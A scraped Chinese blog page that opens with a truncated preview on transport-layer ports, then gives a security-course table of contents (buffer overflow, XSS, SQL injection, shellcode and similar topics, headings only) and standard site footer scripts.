网络层负责的是：提供不同主机之间的逻辑通信（对等层之间的通信好像是“水平”的，实际上要经过下层的协议栈）；应用层上运行着不同的应用。因此，传输层提供的功能是：为不同主机的应用进程之间提供逻辑通信。如下图：  传输层寻址与端口端口与端口号不同的进程怎么使用同一个传输层的协议（复用）与另一个主机的进程进行通信？答案是使用不同的端口。端口号是16位的比特串，用来标识正在通信的进程。端口号可以分为2类：  服务器端使用的端口号。（1）0 ~ 1023：熟知的、已经固定进程的端口号，IANA将其分配给FTP, DNS等TCP/IP最重要的一些应用程序。（2）1024 ~ 49151：登记端口号，需要到IANA...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Set-UID%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">Set-UID程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.</span> <span class="toc-text">知识内容</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%B3%84%E6%BC%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">权限泄漏</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">调用函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-number">1.2.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">通过环境变量实现攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">缓冲区溢出攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9-1"><span class="toc-number">3.1.</span> <span class="toc-text">知识内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-1"><span class="toc-number">3.2.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">竞态条件攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9-2"><span class="toc-number">4.1.</span> <span class="toc-text">知识内容</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.1.</span> <span class="toc-text">文件相关函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B2%98%E6%BB%9E-sticky-%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E4%BF%9D%E6%8A%A4"><span class="toc-number">4.1.2.</span> <span class="toc-text">粘滞 (sticky) 符号链接保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.3.</span> <span class="toc-text">攻击方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-2"><span class="toc-number">4.2.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%86%94%E6%96%AD%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">熔断攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB"><span class="toc-number">6.</span> <span class="toc-text">幽灵攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9-3"><span class="toc-number">6.1.</span> <span class="toc-text">知识内容</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%BB%9F%E8%AE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">6.1.1.</span> <span class="toc-text">基于统计方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-3"><span class="toc-number">6.2.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB%E5%9F%BA%E7%A1%80"><span class="toc-number">7.</span> <span class="toc-text">WEB基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">跨站请求伪造（CSRF）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9-4"><span class="toc-number">8.1.</span> <span class="toc-text">知识内容</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GET%E8%AF%B7%E6%B1%82%E6%94%BB%E5%87%BB"><span class="toc-number">8.1.1.</span> <span class="toc-text">GET请求攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST%E8%AF%B7%E6%B1%82"><span class="toc-number">8.1.2.</span> <span class="toc-text">POST请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%E7%AB%99-cookie"><span class="toc-number">8.1.3.</span> <span class="toc-text">同站 cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Secret-Token-CSRF-Token-%E6%9C%BA%E5%88%B6"><span class="toc-number">8.1.4.</span> <span class="toc-text">Secret Token (CSRF Token) 机制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-4"><span class="toc-number">8.2.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-number">9.</span> <span class="toc-text">跨站脚本攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9-5"><span class="toc-number">9.1.</span> <span class="toc-text">知识内容</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GET%E8%AF%B7%E6%B1%82%E6%94%BB%E5%87%BB-1"><span class="toc-number">9.1.1.</span> <span class="toc-text">GET请求攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST%E8%AF%B7%E6%B1%82%E6%94%BB%E5%87%BB"><span class="toc-number">9.1.2.</span> <span class="toc-text">POST请求攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS-%E8%A0%95%E8%99%AB%EF%BC%9A%E9%80%9A%E8%BF%87-DOM-%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0"><span class="toc-number">9.1.3.</span> <span class="toc-text">XSS 蠕虫：通过 DOM 方法实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CSP-Content-Security-Policy"><span class="toc-number">9.1.4.</span> <span class="toc-text">CSP (Content Security Policy)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-5"><span class="toc-number">9.2.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">10.</span> <span class="toc-text">SQL注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9-6"><span class="toc-number">10.1.</span> <span class="toc-text">知识内容</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-%E8%AF%AD%E5%8F%A5%E4%B8%AD%E7%9A%84%E6%B3%A8%E9%87%8A"><span class="toc-number">10.1.1.</span> <span class="toc-text">SQL 语句中的注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">10.1.2.</span> <span class="toc-text">基本攻击方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-6"><span class="toc-number">10.2.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%94%BB%E5%87%BB"><span class="toc-number">11.</span> <span class="toc-text">格式化字符串攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9-7"><span class="toc-number">11.1.</span> <span class="toc-text">知识内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-7"><span class="toc-number">11.2.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Return-to-libc-%E6%94%BB%E5%87%BB"><span class="toc-number">12.</span> <span class="toc-text">Return-to-libc 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9-8"><span class="toc-number">12.1.</span> <span class="toc-text">知识内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-8"><span class="toc-number">12.2.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode-%E7%BC%96%E7%A8%8B"><span class="toc-number">13.</span> <span class="toc-text">Shellcode 编程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9-9"><span class="toc-number">13.1.</span> <span class="toc-text">知识内容</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0"><span class="toc-number">13.1.1.</span> <span class="toc-text">栈技术实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%AE%B5%E6%96%B9%E6%B3%95"><span class="toc-number">13.1.2.</span> <span class="toc-text">代码段方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-9"><span class="toc-number">13.2.</span> <span class="toc-text">练习</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/background.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By 摘星的辉</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div><div class="footer_custom_text"><div style="text-align:center; margin-top:20px;">
  <div style="margin-top:10px;">
    今天也要继续加油哦！
  </div>
</div>
</div></div><script type="text/javascript" id="maid-script" src="https://unpkg.com/mermaid@undefined/dist/mermaid.min.js?v=undefined"></script><script>if (window.mermaid) {
  var options = JSON.parse(document.getElementById('maid-script').getAttribute('mermaidoptions'));
  mermaid.initialize(options);
}</script></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const loadMathjax = () => {
    if (!window.MathJax) {
      window.MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']],
          tags: 'none',
        },
        chtml: {
          scale: 1.1
        },
        options: {
          enableMenu: true,
          renderActions: {
            findScript: [10, doc => {
              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
                const display = !!node.type.match(/; *mode=display/)
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
                const text = document.createTextNode('')
                node.parentNode.replaceChild(text, node)
                math.start = {node: text, delim: '', n: 0}
                math.end = {node: text, delim: '', n: 0}
                doc.math.push(math)
              }
            }, '']
          }
        }
      }

      const script = document.createElement('script')
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
      script.id = 'MathJax-script'
      script.async = true
      document.head.appendChild(script)
    } else {
      MathJax.startup.document.state(0)
      MathJax.texReset()
      MathJax.typesetPromise()
    }
  }

  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
})()</script><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script id="canvas_nest" defer="defer" color="100,149,237" opacity="0.6" zIndex="-1" count="70" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>